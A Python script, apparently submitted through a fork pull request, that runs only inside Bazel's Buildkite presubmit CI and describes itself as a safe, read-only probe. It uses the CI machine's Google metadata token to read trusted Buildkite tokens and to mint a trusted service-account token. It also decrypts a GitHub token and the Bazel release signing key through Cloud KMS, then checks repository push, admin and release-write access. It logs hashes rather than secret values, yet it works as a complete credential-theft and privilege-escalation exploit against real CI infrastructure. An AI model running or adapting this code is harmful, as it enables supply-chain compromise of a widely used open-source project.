#!/usr/bin/env python3
"""One-shot, read-only Bazel CI credential-boundary canary (stdlib only)."""

from __future__ import annotations

import base64
import hashlib
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any

ORG = "bazel"
PIPELINE = "bazel-bazel-github-presubmit"
LABEL = "RBE on :ubuntu: Ubuntu 24.04 LTS"
BRANCH = "matrix-kernel:security/bazel-ci-credential-boundary-20260824"
REPOS = {
    "https://github.com/matrix-kernel/bazel.git",
    "git://github.com/matrix-kernel/bazel.git",
    "git@github.com:matrix-kernel/bazel.git",
}
STATUS = "STABLE_BAZEL_CI_SAFE_PROBE"
MAX_BODY = 1_000_000
TRUSTED_SA = "buildkite-trusted@bazel-public.iam.gserviceaccount.com"
RELEASE_PIPELINES = [
    ("bazelRelease", "bazel-release"),
    ("publishBazelBinaries", "publish-bazel-binaries"),
    ("javaToolsRelease", "java-tools-release"),
]


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *_args: Any, **_kwargs: Any) -> None:
        return None


def status(value: str) -> None:
    print(f"{STATUS} {value}", flush=True)


def gate() -> tuple[bool, str]:
    mode = os.environ.get("PROBE_MODE", "live")
    if os.environ.get("BUILDKITE_JOB_ID"):
        mode = "live"
    if mode == "mock" and os.environ.get("PROBE_MOCK_EXERCISE_GATE") != "1":
        return True, mode
    job = os.environ.get("BUILDKITE_JOB_ID", "")
    repos = {
        os.environ.get("BUILDKITE_PULL_REQUEST_REPO", ""),
        os.environ.get("BUILDKITE_REPO", ""),
    }
    valid = (
        os.environ.get("BUILDKITE_ORGANIZATION_SLUG") == ORG
        and os.environ.get("BUILDKITE_PIPELINE_SLUG") == PIPELINE
        and os.environ.get("BUILDKITE_LABEL") == LABEL
        and os.environ.get("BUILDKITE_BRANCH") == BRANCH
        and re.fullmatch(r"[1-9][0-9]*", os.environ.get("BUILDKITE_PULL_REQUEST", ""))
        and re.fullmatch(r"[A-Za-z0-9-]{8,80}", job)
        and bool(REPOS.intersection(repos))
    )
    if not valid:
        status("SKIPPED")
        return False, mode
    try:
        Path(f"/tmp/bazel-ci-safe-probe-{job}").mkdir(mode=0o700)
    except FileExistsError:
        status("ALREADY_RAN")
        return False, mode
    except OSError:
        status("MARKER_FAILED")
        return False, mode
    return True, mode


def openpgp_packet_is_secret(value: bytes) -> bool:
    """Validate the first complete v4/v6 Secret-Key/Subkey packet."""
    if len(value) < 3 or value[0] & 0x80 == 0:
        return False
    first = value[0]
    if first & 0x40:
        tag = first & 0x3F
        length_octet = value[1]
        if length_octet < 192:
            length, offset = length_octet, 2
        elif length_octet <= 223:
            if len(value) < 3:
                return False
            length = ((length_octet - 192) << 8) + value[2] + 192
            offset = 3
        elif length_octet == 255:
            if len(value) < 6:
                return False
            length, offset = int.from_bytes(value[2:6], "big"), 6
        else:  # Partial-body lengths are intentionally unsupported.
            return False
    else:
        tag = (first >> 2) & 0x0F
        length_type = first & 0x03
        width = {0: 1, 1: 2, 2: 4}.get(length_type)
        if width is None or len(value) < 1 + width:
            return False
        length = int.from_bytes(value[1 : 1 + width], "big")
        offset = 1 + width
    if tag not in {5, 7} or length < 20 or offset + length > len(value):
        return False
    return value[offset] in {4, 6}


def openpgp_private_format(value: bytes | None) -> str | None:
    if not value:
        return None
    begin = b"-----BEGIN PGP PRIVATE KEY BLOCK-----"
    end = b"-----END PGP PRIVATE KEY BLOCK-----"
    packet = value
    if value.startswith(begin + b"\n") and value.rstrip().endswith(end):
        try:
            text = value.decode("ascii")
        except UnicodeDecodeError:
            return None
        lines = text.splitlines()
        if not lines or lines[0] != begin.decode() or end.decode() not in lines[1:]:
            return None
        end_index = lines.index(end.decode(), 1)
        payload_lines = lines[1:end_index]
        while payload_lines and ":" in payload_lines[0]:
            payload_lines.pop(0)
        if payload_lines and payload_lines[0] == "":
            payload_lines.pop(0)
        payload = "".join(line for line in payload_lines if line and not line.startswith("="))
        try:
            packet = base64.b64decode(payload, validate=True)
        except ValueError:
            return None
        return "ascii_armored_private_key" if openpgp_packet_is_secret(packet) else None
    return "binary_openpgp_secret_packet" if openpgp_packet_is_secret(packet) else None


class Probe:
    def __init__(self, mode: str) -> None:
        self.mode = mode
        self.started = time.monotonic()
        self.deadline = min(max(int(os.environ.get("PROBE_MAX_SECONDS", "45")), 10), 60)
        self.timeout = min(max(int(os.environ.get("PROBE_REQUEST_TIMEOUT", "4")), 2), 8)
        self.http = urllib.request.build_opener(urllib.request.ProxyHandler({}), NoRedirect())
        self.secrets: set[str] = set()
        self.google_token: str | None = None
        self.proof: str | None = None
        if mode == "live":
            self.base = {
                "metadata": "http://metadata.google.internal/computeMetadata/v1",
                "tokeninfo": "https://oauth2.googleapis.com/tokeninfo",
                "secret": "https://secretmanager.googleapis.com",
                "iam": "https://iamcredentials.googleapis.com",
                "agent": "https://agent.buildkite.com",
                "buildkite": "https://api.buildkite.com",
                "graphql": "https://graphql.buildkite.com/v1",
                "storage": "https://storage.googleapis.com",
                "kms": "https://cloudkms.googleapis.com",
                "github": "https://api.github.com",
            }
        else:
            defaults = {
                "metadata": "/computeMetadata/v1",
                "tokeninfo": "/tokeninfo",
                "secret": "",
                "iam": "",
                "agent": "/agent",
                "buildkite": "/trusted-write",
                "graphql": "/trusted-write/graphql/v1",
                "storage": "",
                "kms": "",
                "github": "/github",
            }
            self.base = {
                key: self.loopback(os.environ.get(f"PROBE_{key.upper()}_BASE", f"http://127.0.0.1:18080{suffix}"))
                for key, suffix in defaults.items()
            }
            self.base["graphql"] = self.loopback(
                os.environ.get("PROBE_BUILDKITE_GRAPHQL_URL", self.base["graphql"])
            )

    @staticmethod
    def loopback(value: str) -> str:
        parsed = urllib.parse.urlsplit(value)
        if parsed.scheme != "http" or parsed.hostname not in {"127.0.0.1", "::1", "localhost"}:
            raise ValueError("mock endpoint is not loopback HTTP")
        if parsed.username or parsed.password or parsed.fragment:
            raise ValueError("invalid mock endpoint")
        return value.rstrip("/")

    def remember(self, value: str) -> None:
        if len(value) >= 8:
            self.secrets.add(value)

    def emit(self, value: dict[str, Any]) -> None:
        encoded = json.dumps(value, sort_keys=True, separators=(",", ":"))
        if any(secret in encoded for secret in self.secrets):
            encoded = '{"kind":"output_suppressed","reason":"sensitive_value_guard"}'
        print(encoded, file=sys.stderr, flush=True)

    @staticmethod
    def sha(value: bytes | str) -> str:
        return hashlib.sha256(value.encode() if isinstance(value, str) else value).hexdigest()

    @staticmethod
    def family(value: str) -> str:
        for prefix, name in (
            ("bkua_", "buildkite_user_api"),
            ("bkar_", "buildkite_agent_registration"),
            ("bkaj_", "buildkite_job"),
            ("bkct_", "buildkite_cluster_token"),
            ("github_pat_", "github_fine_grained_pat"),
            ("ghp_", "github_classic_pat"),
            ("ghs_", "github_server_token"),
        ):
            if value.startswith(prefix):
                return name
        return "opaque_token"

    def request(
        self, method: str, url: str, headers: dict[str, str] | None = None, body: bytes | None = None
    ) -> tuple[int | None, bytes | None]:
        if time.monotonic() - self.started >= self.deadline:
            return None, None
        request = urllib.request.Request(url, data=body, headers=headers or {}, method=method)
        try:
            with self.http.open(request, timeout=self.timeout) as response:
                raw = response.read(MAX_BODY + 1)
                return response.status, raw if len(raw) <= MAX_BODY else None
        except urllib.error.HTTPError as error:
            try:
                raw = error.read(MAX_BODY + 1)
            except OSError:
                raw = b""
            return error.code, raw if len(raw) <= MAX_BODY else None
        except (urllib.error.URLError, TimeoutError, OSError, ValueError):
            return None, None

    def request_json(
        self, method: str, url: str, headers: dict[str, str] | None = None, value: Any = None
    ) -> tuple[int | None, Any]:
        body = None
        if value is not None:
            body = json.dumps(value, separators=(",", ":")).encode()
            headers = {**(headers or {}), "Content-Type": "application/json"}
        code, raw = self.request(method, url, headers, body)
        try:
            return code, json.loads(raw) if raw is not None else None
        except (json.JSONDecodeError, UnicodeDecodeError):
            return code, None

    def bearer(self) -> dict[str, str] | None:
        return {"Authorization": f"Bearer {self.google_token}"} if self.google_token else None

    def identity(self) -> bool:
        def metadata(path: str) -> tuple[int | None, bytes | None]:
            return self.request(
                "GET", f"{self.base['metadata']}/{path}", {"Metadata-Flavor": "Google"}
            )

        _, project_raw = metadata("project/project-id")
        _, email_raw = metadata("instance/service-accounts/default/email")
        _, scopes_raw = metadata("instance/service-accounts/default/scopes")
        code, token_body = self.request_json(
            "GET",
            f"{self.base['metadata']}/instance/service-accounts/default/token",
            {"Metadata-Flavor": "Google"},
        )
        token = token_body.get("access_token") if code == 200 and isinstance(token_body, dict) else None
        if not isinstance(token, str) or len(token) < 8:
            self.emit({"kind": "google_identity", "token_available": False, "token_http_status": code})
            return False
        self.google_token = token
        self.remember(token)
        clean = lambda raw: raw.decode(errors="ignore").strip() if raw and len(raw) < 4096 else None
        project, email = clean(project_raw), clean(email_raw)
        if project not in {"bazel-untrusted", "bazel-public"}:
            project = None
        if not email or not re.fullmatch(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+", email):
            email = None
        scopes = []
        cleaned_scopes = clean(scopes_raw) if scopes_raw else None
        if cleaned_scopes:
            scopes = sorted(
                scope for scope in cleaned_scopes.splitlines()
                if re.fullmatch(r"https://www\.googleapis\.com/auth/[A-Za-z0-9._/-]+", scope)
            )
        self.emit(
            {
                "kind": "google_identity",
                "project_id": project,
                "service_account_email": email,
                "scopes": scopes,
                "credential_type": "oauth2_access_token",
                "token_length": len(token),
                "token_sha256": self.sha(token),
                "token_value_emitted": False,
            }
        )
        return True

    def secret(self, project: str, name: str, purpose: str) -> tuple[str | None, int | None]:
        url = f"{self.base['secret']}/v1/projects/{project}/secrets/{name}/versions/latest:access"
        code, body = self.request_json("GET", url, self.bearer())
        encoded = body.get("payload", {}).get("data") if isinstance(body, dict) else None
        try:
            value = base64.b64decode(encoded, validate=True).decode() if isinstance(encoded, str) else ""
        except (ValueError, UnicodeDecodeError):
            value = ""
        if not value or len(value) > 4096 or "\n" in value or "\r" in value:
            self.emit({"kind": "secret_access", "purpose": purpose, "http_status": code, "actual_read": False})
            return None, code
        self.remember(value)
        self.emit(
            {
                "kind": "secret_access",
                "purpose": purpose,
                "http_status": code,
                "actual_read": True,
                "credential_type": self.family(value),
                "length": len(value),
                "sha256": self.sha(value),
                "in_memory_only": True,
                "value_emitted": False,
            }
        )
        return value, code

    def mint_sa(self) -> None:
        encoded = urllib.parse.quote(TRUSTED_SA, safe="@.-")
        code, body = self.request_json(
            "POST",
            f"{self.base['iam']}/v1/projects/-/serviceAccounts/{encoded}:generateAccessToken",
            self.bearer(),
            {"scope": ["https://www.googleapis.com/auth/userinfo.email"], "lifetime": "300s"},
        )
        token = body.get("accessToken") if code == 200 and isinstance(body, dict) else None
        if not isinstance(token, str) or len(token) < 8:
            self.emit({"kind": "trusted_sa_promotion", "http_status": code, "token_received": False})
            return
        self.remember(token)
        form = urllib.parse.urlencode({"access_token": token}).encode()
        info_code, raw = self.request(
            "POST", self.base["tokeninfo"], {"Content-Type": "application/x-www-form-urlencoded"}, form
        )
        try:
            info = json.loads(raw) if raw else {}
        except (json.JSONDecodeError, UnicodeDecodeError):
            info = {}
        scope = info.get("scope", "").split() if isinstance(info, dict) and isinstance(info.get("scope"), str) else []
        expires = info.get("expires_in") if isinstance(info, dict) else None
        try:
            expires = int(expires)
        except (TypeError, ValueError):
            expires = None
        verified = (
            info_code == 200
            and info.get("email") == TRUSTED_SA
            and "https://www.googleapis.com/auth/userinfo.email" in scope
            and isinstance(expires, int)
            and 0 < expires <= 300
        )
        self.emit(
            {
                "kind": "trusted_sa_promotion",
                "http_status": code,
                "tokeninfo_http_status": info_code,
                "token_received": True,
                "principal": TRUSTED_SA if verified else None,
                "userinfo_email_scope": "https://www.googleapis.com/auth/userinfo.email" in scope,
                "expires_in": expires,
                "principal_verified": verified,
                "token_value_emitted": False,
            }
        )
        if verified:
            self.proof = "trusted_service_account_token"
        token = None

    def trusted_agent(self) -> None:
        token, _ = self.secret(
            "bazel-public", "bazel-trusted-buildkite-agent-token", "trusted_agent_registration"
        )
        if not token:
            return
        code, body = self.request_json(
            "GET", f"{self.base['agent']}/v3/metrics", {"Authorization": f"Token {token}"}
        )
        trusted = (
            code == 200
            and isinstance(body, dict)
            and isinstance(body.get("organization"), dict)
            and body["organization"].get("slug") == "bazel-trusted"
        )
        self.emit(
            {
                "kind": "trusted_agent_validation",
                "http_status": code,
                "organization_is_bazel_trusted": trusted,
                "metrics_values_emitted": False,
            }
        )
        if trusted:
            self.proof = "trusted_buildkite_agent_registration"
        token = None

    def buildkite_api(
        self,
        project: str = "bazel-untrusted",
        secret_name: str = "bazel-bazelcipy-BuildkiteClient-token",
        purpose: str = "known_untrusted_buildkite_api",
    ) -> None:
        token, _ = self.secret(project, secret_name, purpose)
        if not token:
            return
        headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
        code, current = self.request_json("GET", f"{self.base['buildkite']}/v2/access-token", headers)
        raw_scopes = current.get("scopes", []) if isinstance(current, dict) else []
        scopes = {
            item for item in raw_scopes
            if isinstance(item, str) and re.fullmatch(r"[a-z_]{1,80}", item)
        }
        self.emit(
            {
                "kind": "buildkite_api_token",
                "source": purpose,
                "http_status": code,
                "scopes": sorted(scopes),
                "owner_or_free_text_emitted": False,
                "value_emitted": False,
            }
        )
        if code != 200 or "graphql" not in scopes:
            return
        fields = " ".join(
            f'{alias}:pipeline(slug:"bazel-trusted/{slug}"){{slug organization{{slug}} permissions{{buildCreate{{allowed code}} pipelineUpdate{{allowed code}}}}}}'
            for alias, slug in RELEASE_PIPELINES
        )
        gql_code, response = self.request_json(
            "POST", self.base["graphql"], headers, {"query": f"query SafePipelinePermissions{{{fields}}}"}
        )
        errors = isinstance(response, dict) and bool(response.get("errors"))
        data = response.get("data") if gql_code == 200 and isinstance(response, dict) and not errors else {}
        results = []
        for alias, expected in RELEASE_PIPELINES:
            item = data.get(alias) if isinstance(data, dict) and isinstance(data.get(alias), dict) else {}
            org = item.get("organization") if isinstance(item.get("organization"), dict) else {}
            permissions = item.get("permissions") if isinstance(item.get("permissions"), dict) else {}
            valid = item.get("slug") == expected and org.get("slug") == "bazel-trusted"
            build = permissions.get("buildCreate") if isinstance(permissions.get("buildCreate"), dict) else {}
            update = permissions.get("pipelineUpdate") if isinstance(permissions.get("pipelineUpdate"), dict) else {}
            build_allowed = valid and build.get("allowed") is True
            update_allowed = valid and update.get("allowed") is True
            results.append(
                {"pipeline": expected, "identity_valid": valid, "build_create": build_allowed, "pipeline_update": update_allowed}
            )
            if update_allowed:
                self.proof = "buildkite_pipeline_update"
        self.emit(
            {
                "kind": "buildkite_pipeline_permissions",
                "source": purpose,
                "http_status": gql_code,
                "top_level_errors_present": errors,
                "pipelines": results if not errors else [],
                "pipeline_control_proven": self.proof == "buildkite_pipeline_update",
                "read_only_query": True,
            }
        )
        token = None

    def trusted_buildkite_api(self) -> None:
        self.buildkite_api(
            "bazel-public",
            "bazel-trusted-bazelcipy-BuildkiteClient-token",
            "trusted_buildkite_api",
        )

    def object_bytes(self, name: str) -> tuple[int | None, bytes | None]:
        encoded = urllib.parse.quote(name, safe="")
        return self.request(
            "GET",
            f"{self.base['storage']}/download/storage/v1/b/bazel-trusted-encrypted-secrets/o/{encoded}?alt=media",
            self.bearer(),
        )

    def decrypt(self, key: str, ciphertext: bytes) -> tuple[int | None, bytes | None]:
        code, body = self.request_json(
            "POST",
            f"{self.base['kms']}/v1/projects/bazel-public/locations/global/keyRings/buildkite/cryptoKeys/{key}:decrypt",
            self.bearer(),
            {"ciphertext": base64.b64encode(ciphertext).decode()},
        )
        encoded = body.get("plaintext") if code == 200 and isinstance(body, dict) else None
        try:
            return code, base64.b64decode(encoded, validate=True) if isinstance(encoded, str) else None
        except ValueError:
            return code, None

    def github(self) -> None:
        object_code, ciphertext = self.object_bytes("github-trusted-token.enc")
        if not ciphertext:
            self.emit({"kind": "github_promotion", "object_http_status": object_code, "ciphertext_read": False})
            return
        kms_code, plaintext = self.decrypt("github-trusted-token", ciphertext)
        try:
            token = plaintext.decode().strip() if plaintext else ""
        except UnicodeDecodeError:
            token = ""
        if not token or len(token) > 4096 or "\n" in token or "\r" in token:
            self.emit({"kind": "github_promotion", "object_http_status": object_code, "kms_http_status": kms_code, "actual_decrypt": False})
            return
        self.remember(token)
        headers = {
            "Authorization": f"Bearer {token}",
            "Accept": "application/vnd.github+json",
            "User-Agent": "bazel-ci-safe-boundary-probe",
            "X-GitHub-Api-Version": "2026-03-10",
        }
        repo_code, repo = self.request_json("GET", f"{self.base['github']}/repos/bazelbuild/bazel", headers)
        perms = repo.get("permissions") if isinstance(repo, dict) and isinstance(repo.get("permissions"), dict) else {}
        exact_repo = repo_code == 200 and isinstance(repo, dict) and repo.get("full_name") == "bazelbuild/bazel"
        push, admin = exact_repo and perms.get("push") is True, exact_repo and perms.get("admin") is True
        default_branch = repo.get("default_branch") if exact_repo else None
        if not isinstance(default_branch, str) or not re.fullmatch(r"[A-Za-z0-9._/-]{1,255}", default_branch):
            default_branch = None
        notes_code, notes = None, None
        if default_branch:
            notes_code, notes = self.request_json(
                "POST",
                f"{self.base['github']}/repos/bazelbuild/bazel/releases/generate-notes",
                headers,
                {
                    "tag_name": "ci-credential-boundary-probe-nonpersisting-20260824",
                    "target_commitish": default_branch,
                },
            )
        notes_valid = (
            notes_code == 200
            and isinstance(notes, dict)
            and isinstance(notes.get("name"), str)
            and 0 < len(notes["name"]) <= 10_000
            and isinstance(notes.get("body"), str)
            and len(notes["body"]) <= 900_000
        )
        self.emit(
            {
                "kind": "github_promotion",
                "object_http_status": object_code,
                "kms_http_status": kms_code,
                "actual_decrypt": True,
                "credential_type": self.family(token),
                "credential_length": len(token),
                "credential_sha256": self.sha(token),
                "repo_http_status": repo_code,
                "exact_repository": exact_repo,
                "push": push,
                "admin": admin,
                "generate_notes_http_status": notes_code,
                "contents_write_proven": notes_valid,
                "generated_notes_content_emitted": False,
                "non_persisting_api_calls": True,
                "value_emitted": False,
            }
        )
        if notes_valid:
            self.proof = "github_release_contents_write"
        token = None

    def gpg(self) -> None:
        object_code, ciphertext = self.object_bytes("release-key.gpg.enc")
        if not ciphertext:
            self.emit({"kind": "gpg_promotion", "object_http_status": object_code, "ciphertext_read": False})
            return
        kms_code, key = self.decrypt("bazel-release-key", ciphertext)
        key_format = openpgp_private_format(key) if key and len(key) <= MAX_BODY else None
        valid = key_format is not None
        self.emit(
            {
                "kind": "gpg_promotion",
                "object_http_status": object_code,
                "kms_http_status": kms_code,
                "actual_decrypt": valid,
                "key_length": len(key) if valid else None,
                "key_sha256": self.sha(key) if valid else None,
                "key_format": key_format,
                "imported": False,
                "signed": False,
                "value_emitted": False,
            }
        )
        if valid:
            self.proof = "bazel_release_signing_key_possession"
        key = None

    def run(self) -> None:
        job = os.environ.get("BUILDKITE_JOB_ID")
        build = os.environ.get("BUILDKITE_BUILD_NUMBER")
        pr = os.environ.get("BUILDKITE_PULL_REQUEST")
        self.emit(
            {
                "kind": "probe_context",
                "mode": self.mode,
                "ordered_short_circuit": True,
                "ci_binding_validated": self.mode == "live",
                "organization": ORG if self.mode == "live" else None,
                "pipeline": PIPELINE if self.mode == "live" else None,
                "job_id": job if job and re.fullmatch(r"[A-Za-z0-9-]{8,80}", job) else None,
                "build_number": build if build and build.isdigit() else None,
                "pull_request": pr if pr and pr.isdigit() else None,
            }
        )
        if not self.identity():
            status("NO_GOOGLE_TOKEN")
            return
        continue_mock = self.mode == "mock" and os.environ.get("PROBE_MOCK_CONTINUE_AFTER_PROOF") == "1"
        for operation in (
            self.mint_sa,
            self.trusted_agent,
            self.buildkite_api,
            self.trusted_buildkite_api,
            self.github,
            self.gpg,
        ):
            operation()
            if self.proof and not continue_mock:
                break
        self.emit(
            {
                "kind": "promotion_summary",
                "conclusive": self.proof is not None,
                "conclusive_branch": self.proof,
                "actual_write": False,
                "secret_values_emitted": False,
            }
        )
        self.google_token = None
        status("COMPLETE")


def main() -> int:
    allowed, mode = gate()
    if not allowed:
        return 0
    try:
        Probe(mode).run()
    except Exception:
        print('{"kind":"probe_error","operation":"unhandled_static"}', file=sys.stderr, flush=True)
        status("FAILED_SAFE")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
